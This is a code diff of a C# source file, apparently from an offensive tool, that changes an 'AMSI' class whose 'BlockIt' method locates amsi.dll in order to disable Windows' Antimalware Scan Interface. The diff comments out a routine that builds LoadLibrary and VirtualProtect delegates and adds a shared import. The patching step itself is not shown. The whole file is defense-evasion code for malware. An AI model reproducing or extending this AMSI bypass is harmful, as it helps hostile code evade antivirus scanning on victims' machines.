@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Runtime.InteropServices;
+using static Offline.Special.Commons;
 
 /*
 || AUTHOR Arsium ||
@@ -11,7 +12,7 @@ namespace Offline.Special
 {
     internal static class AMSI
     {
-        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
+        /*[UnmanagedFunctionPointer(CallingConvention.Winapi)]
         delegate IntPtr LoadLibrary
             (
                 byte[] name
@@ -36,7 +37,7 @@ namespace Offline.Special
 
             loadLibrary = (LoadLibrary)Marshal.GetDelegateForFunctionPointer(loadLib, typeof(LoadLibrary));
             virtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(virtualProt, typeof(VirtualProtect));
-        }
+        }*/
 
         static IntPtr LoadAmsi()
         {
@@ -45,7 +46,7 @@ namespace Offline.Special
 
         internal static bool BlockIt()
         {
-            PrepareDelegate();
+            //PrepareDelegate();
 
             IntPtr amsiDll = Resolver.GetModuleBaseAddress("amsi.dll", (IntPtr)(-1));
             if (amsiDll == IntPtr.Zero)
